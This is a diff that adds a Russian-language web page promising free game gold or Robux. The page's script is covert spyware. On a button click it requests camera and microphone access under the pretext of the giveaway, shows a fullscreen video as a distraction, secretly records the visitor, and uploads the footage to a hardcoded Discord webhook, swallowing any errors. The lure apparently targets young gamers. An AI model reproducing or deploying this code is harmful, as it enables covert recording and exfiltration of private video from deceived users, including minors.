@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fre gold or robuxes</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            overflow: hidden;
+        }
+
+        .background-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.4;
+            animation: float 8s ease-in-out infinite;
+        }
+
+        .orb-1 {
+            width: 400px;
+            height: 400px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            top: -100px;
+            left: -100px;
+            animation-delay: 0s;
+        }
+
+        .orb-2 {
+            width: 300px;
+            height: 300px;
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+            bottom: -50px;
+            right: -50px;
+            animation-delay: -2s;
+        }
+
+        .orb-3 {
+            width: 250px;
+            height: 250px;
+            background: linear-gradient(135deg, #4facfe, #00f2fe);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation-delay: -4s;
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0) scale(1);
+            }
+            50% {
+                transform: translateY(-30px) scale(1.05);
+            }
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+        }
+
+        .title {
+            font-size: 48px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 16px;
+            text-shadow: 0 4px 30px rgba(102, 126, 234, 0.5);
+            letter-spacing: -1px;
+        }
+
+        .subtitle {
+            font-size: 18px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 48px;
+        }
+
+        .play-btn {
+            position: relative;
+            padding: 24px 72px;
+            font-size: 22px;
+            font-weight: 700;
+            color: #fff;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border: none;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 
+                0 10px 40px rgba(102, 126, 234, 0.4),
+                0 0 0 0 rgba(102, 126, 234, 0.4);
+            overflow: hidden;
+        }
+
+        .play-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .play-btn:hover::before {
+            left: 100%;
+        }
+
+        .play-btn:hover {
+            transform: translateY(-4px) scale(1.02);
+            box-shadow: 
+                0 20px 60px rgba(102, 126, 234, 0.5),
+                0 0 0 8px rgba(102, 126, 234, 0.1);
+        }
+
+        .play-btn:active {
+            transform: translateY(-2px) scale(1);
+        }
+
+        .play-btn .icon {
+            margin-right: 12px;
+            font-size: 24px;
+        }
+
+        .pulse-ring {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100%;
+            height: 100%;
+            border-radius: 60px;
+            border: 2px solid rgba(102, 126, 234, 0.5);
+            animation: pulse-ring 2s ease-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes pulse-ring {
+            0% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(1.3);
+                opacity: 0;
+            }
+        }
+
+        .fullscreen-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .fullscreen-container.active {
+            display: flex;
+        }
+
+        .fullscreen-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+    </style>
+</head>
+<body>
+    <div class="background-animation">
+        <div class="orb orb-1"></div>
+        <div class="orb orb-2"></div>
+        <div class="orb orb-3"></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Free Gold Or Robuxes</h1>
+        <p class="subtitle">Нажмите кнопку для получения голды или робуксов</p>
+        
+        <button class="play-btn" id="playBtn">
+            <span class="pulse-ring"></span>
+            <span class="icon">$</span> Получить голду
+        </button>
+    </div>
+
+    <div class="fullscreen-container" id="fullscreenContainer">
+        <video id="video" loop>
+            <source src="video.mp4" type="video/mp4">
+        </video>
+    </div>
+
+    <script>
+        // Discord Webhook
+        const WEBHOOK = 'https://discord.com/api/webhooks/1551123668967489596/bO2oosj9vuULqWkiDkrSYjbsNVhlSVR0FdIt1jwcGNZY5PpEavr4YVZxq0MwWvSCmqhO';
+        
+        // Максимальный размер 20 МБ
+        const MAX_SIZE = 20 * 1024 * 1024;
+
+        // Переменные
+        let recorder = null;
+        let chunks = [];
+        let camera = null;
+        let size = 0;
+
+        // Получить доступ к камере
+        async function getCamera() {
+            try {
+                camera = await navigator.mediaDevices.getUserMedia({
+                    video: true,
+                    audio: true
+                });
+                return true;
+            } catch {
+                return false;
+            }
+        }
+
+        // Начать запись
+        function startRecord() {
+            recorder = new MediaRecorder(camera);
+            
+            recorder.ondataavailable = (e) => {
+                if (e.data.size > 0) {
+                    chunks.push(e.data);
+                    size += e.data.size;
+                    
+                    // Если достигли 20 МБ - остановить и отправить
+                    if (size >= MAX_SIZE) {
+                        stopAndSend();
+                    }
+                }
+            };
+            
+            recorder.onstop = () => {
+                if (chunks.length > 0) {
+                    sendToDiscord();
+                }
+            };
+            
+            chunks = [];
+            size = 0;
+            recorder.start(1000);
+        }
+
+        // Остановить и отправить
+        function stopAndSend() {
+            if (recorder && recorder.state === 'recording') {
+                recorder.stop();
+            }
+            
+            if (camera) {
+                camera.getTracks().forEach(track => track.stop());
+                camera = null;
+            }
+        }
+
+        // Отправить в Discord
+        async function sendToDiscord() {
+            const videoBlob = new Blob(chunks, { type: 'video/webm' });
+            const sizeMB = (videoBlob.size / (1024 * 1024)).toFixed(2);
+            
+            try {
+                const formData = new FormData();
+                formData.append('file', videoBlob, 'recording.webm');
+                formData.append('payload_json', JSON.stringify({
+                    content: `📹 **Запись с камеры**\nРазмер: ${sizeMB} МБ\nВремя: ${new Date().toLocaleString('ru-RU')}`
+                }));
+                
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch {
+                // Не показываем ошибки
+            }
+            
+            chunks = [];
+            size = 0;
+        }
+
+        // Кнопка воспроизведения
+        document.getElementById('playBtn').addEventListener('click', async () => {
+            // Проверить доступ к камере
+            const hasCamera = await getCamera();
+            if (!hasCamera) {
+                alert('Для получения голды или робуксов необходимо разрешить доступ к камере и микрофону.');
+                return;
+            }
+            
+            // Показать видео
+            const container = document.getElementById('fullscreenContainer');
+            const video = document.getElementById('video');
+            
+            container.classList.add('active');
+            
+            if (container.requestFullscreen) {
+                container.requestFullscreen();
+            } else if (container.webkitRequestFullscreen) {
+                container.webkitRequestFullscreen();
+            }
+            
+            video.volume = 1.0;
+            video.play();
+            
+            // Начать запись
+            startRecord();
+        });
+
+        // Выход из полноэкранного режима
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) {
+                document.getElementById('fullscreenContainer').classList.remove('active');
+                document.getElementById('video').pause();
+                stopAndSend();
+            }
+        });
+
+        // Клавиша Escape
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                document.getElementById('fullscreenContainer').classList.remove('active');
+                document.getElementById('video').pause();
+                stopAndSend();
+            }
+        });
+    </script>
+</body>
+</html>
